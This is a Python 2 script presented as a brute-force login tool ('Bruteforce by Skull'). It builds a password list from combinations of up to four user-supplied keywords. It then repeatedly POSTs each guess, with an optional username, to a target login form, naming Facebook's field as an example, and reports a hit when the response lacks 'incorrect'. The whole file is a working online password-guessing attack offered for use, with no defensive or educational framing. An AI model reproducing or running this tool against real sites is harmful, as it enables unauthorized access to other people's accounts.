#!/usr/bin/python2.7
# -*-coding:Utf-8 -*

# Bruteforce by Skull
#
#	 		  ______   ___ ___  __    __  __        __
#			 /\     \ |\  \\  \|\ \  |\ \|\ \      |\ \
#			|\ ######\| ##/ ##/| ##  | ##| ##      | ##
#			| ##___\##| ## ##/ | ##  | ##| ##      | ##
#			 \##\   \ | ####/  | ##  | ##| ##      | ##
#			 _\######\| ###(   | ## _| ##| ##      | ##
#			|  \__| ##| ####\  | ##/ \ ##| ##_____ | ##_____
#			 \##   \##| ## ##\  \## ## ##| ##\    \| ##\    \
#	                  \######  \##\_##\  \######/ \######## \########
#
# 'requests' must be install
# If not, use pip to install it

import requests
import sys
import os
from requests.auth import HTTPBasicAuth
from threading import Thread

os.system('clear')

print("\t\t\t=== Bruteforce by Skull ===\n")

try:
	host = raw_input("Url/IP of the target > ")
	print("\nConnection...")

	r = requests.get(host)
	host = r.url 
except:
	print("\nConnecion error...\n")
	sys.exit(1)
else:
	print("Successful connection...\n")

i = 0

fichier = open("passlist.txt", "w")

lectureFichier = ""

print("What's the id of the pass in the source code ?")
passID = raw_input("(Like \"pass\" for Facebook) : ")
words = raw_input("\nKeywords : ")
word1 = ""
word2 = ""
word3 = ""
word4 = ""

i = 0
j = 0
l = 0
k = 0

while i != len(words):
	if word1 == "":
		if words[i] == " ":
			word1 = words[0:i]
			j = i+1
		elif i == (len(words)-1):
			word1 = words[0:i+1]
			j = i+1
	elif word2 == "":
		if words[i] == " ":
			word2 = words[j:i]
			j = i+1
		elif i == (len(words)-1):
			word2 = words[j:i+1]
			j = i+1
	elif word3 == "":
		if words[i] == " ":
			word3 = words[j:i]
			j = i+1
		elif i == (len(words)-1):
			word3 = words[j:i+1]
			j = i+1
	elif word4 == "":
		if words[i] == " ":
			word4 = words[j:i]
			j = i+1
		elif i == (len(words)-1):
			word4 = words[j:i+1]
			j = i+1
	i += 1 

print

if word1 != "" and word2 == "" and word3 == "" and word4 == "":
	fichier.write(word1)
	fichier.write("\n")

if word1 != "" and word2 != "" and word3 == "" and word4 == "":
	i = 0

	while i != 2:
		if i == 0:
			fichier.write(word1)
		elif i == 1:
			fichier.write(word2)

		fichier.write("\n")

		i += 1

	i = 0

	while i != 2:
		j = 0

		while j != 2:
			if i == 0:
				fichier.write(word1)
			elif i == 1:
				fichier.write(word2)

			if j == 0:
				fichier.write(word1)
			elif j == 1:
				fichier.write(word2)

			fichier.write("\n")

			j += 1

		i += 1

if word1 != "" and word2 != "" and word3 != "" and word4 == "":
	i = 0

	while i != 3:
		if i == 0:
			fichier.write(word1)
		elif i == 1:
			fichier.write(word2)
		elif i == 2:
			fichier.write(word3)

		fichier.write("\n")

		i += 1

	i = 0

	while i != 3:
		j = 0

		while j != 3:
			if i == 0:
				fichier.write(word1)
			elif i == 1:
				fichier.write(word2)
			elif i == 2:
				fichier.write(word3)	
				
			if j == 0:
				fichier.write(word1)
			elif j == 1:
				fichier.write(word2)
			elif j == 2:
				fichier.write(word3)

			fichier.write("\n")		

			j += 1

		i += 1 

	i = 0

	while i != 3:
		j = 0

		while j != 3:
			l = 0

			while l != 3:
				if i == 0:
					fichier.write(word1)
				elif i == 1:
					fichier.write(word2)
				elif i == 2:
					fichier.write(word3)	
					
				if j == 0:
					fichier.write(word1)
				elif j == 1:
					fichier.write(word2)
				elif j == 2:
					fichier.write(word3)	
					
				if l == 0:
					fichier.write(word1)
				elif l == 1:
					fichier.write(word2)
				elif l == 2:
					fichier.write(word3)			

				fichier.write("\n")

				l += 1

			j += 1

		i += 1

if word1 != "" and word2 != "" and word3 != "" and word4 != "":
	i = 0

	while i != 4:
		if i == 0:
			fichier.write(word1)
		elif i == 1:
			fichier.write(word2)
		elif i == 2:
			fichier.write(word3)
		elif i == 3:
			fichier.write(word4)

		fichier.write("\n")

		i += 1

	i = 0

	while i != 4:
		j = 0

		while j != 4:
			if i == 0:
				fichier.write(word1)
			elif i == 1:
				fichier.write(word2)
			elif i == 2:
				fichier.write(word3)
			elif i == 3:
				fichier.write(word4)

			if j == 0:
				fichier.write(word1)
			elif j == 1:
				fichier.write(word2)
			elif j == 2:
				fichier.write(word3)
			elif j == 3:
				fichier.write(word4)

			fichier.write("\n")

			j += 1			

		i += 1

	i = 0

	while i != 4:
		j = 0

		while j != 4:
			l = 0

			while l != 4:
				if i == 0:
					fichier.write(word1)
				elif i == 1:
					fichier.write(word2)
				elif i == 2:
					fichier.write(word3)
				elif i == 3:
					fichier.write(word4)

				if j == 0:
					fichier.write(word1)
				elif j == 1:
					fichier.write(word2)
				elif j == 2:
					fichier.write(word3)
				elif j == 3:
					fichier.write(word4)

				if l == 0:
					fichier.write(word1)
				elif l == 1:
					fichier.write(word2)
				elif l == 2:
					fichier.write(word3)
				elif l == 3:
					fichier.write(word4)			
					
				fichier.write("\n")

				l += 1

			j += 1

		i += 1	

	i = 0

	while i != 4:
		j = 0

		while j != 4:
			l = 0

			while l != 4:
				k = 0

				while k != 4:
					if i == 0:
						fichier.write(word1)
					elif i == 1:
						fichier.write(word2)
					elif i == 2:
						fichier.write(word3)
					elif i == 3:
						fichier.write(word4)

					if j == 0:
						fichier.write(word1)
					elif j == 1:
						fichier.write(word2)
					elif j == 2:
						fichier.write(word3)
					elif j == 3:
						fichier.write(word4)

					if l == 0:
						fichier.write(word1)
					elif l == 1:
						fichier.write(word2)
					elif l == 2:
						fichier.write(word3)
					elif l == 3:
						fichier.write(word4)

					if k == 0:
						fichier.write(word1)
					elif k == 1:
						fichier.write(word2)
					elif k == 2:
						fichier.write(word3)
					elif k == 3:
						fichier.write(word4)

					fichier.write("\n")

					k += 1

				l += 1

			j += 1

		i += 1

	i = 0

fichier.close()

fichier = open("passlist.txt", "r")

lectureFichier = fichier.read()

i = 0
j = 0 
l = 0
k = 0

password = ""

while i != len(lectureFichier):
	if lectureFichier[i] == "\n":
		k += 1

	i += 1

print(str(k) + " passwords found.\n")

i = 0
j = 0 
l = 0
connection = 0
passFind = 0

password = ""

pseudo = raw_input("Pseudo (0 if none): ")
if str(pseudo) != "0":
	print("What's the id in the source code ?")
	nickID = raw_input("(Like \"email\" for Facebook) : ")

while i != len(lectureFichier):
	if lectureFichier[i] == "\n":
		if j == 0:
			password = lectureFichier[j:i]
		else:
			password = lectureFichier[j+1:i]

		os.system('clear')

		print("Url/IP of the target > "+host)
		print("\nConnection...")
		print("Successful connection...\n")
		print("Keywords : "+word1+" "+word2+" "+word3+" "+word4)
		print("\n"+str(k)+" passwords found.\n")
		print("Pseudo (0 if none): "+pseudo+"\n")

		print("Password "+str(l+1)+" of "+str(k)+"...\n")

		if str(pseudo) == "0":
			connection = {passID: password}
			r = requests.post(host, data=connection)
		else:
			connection = {passID: password, nickID: pseudo}
			r = requests.post(host, data=connection)

		passFind = r.text.find("incorrect", 0, len(r.text))

		if passFind == -1:
			print("Password find !... : "+password)

			fichier.close()

			os.system('rm -rf passlist.txt')
			sys.exit(1)
			
		l += 1
		j = i

	i += 1

print("Password not found...")

fichier.close()

os.system('rm -rf passlist.txt')
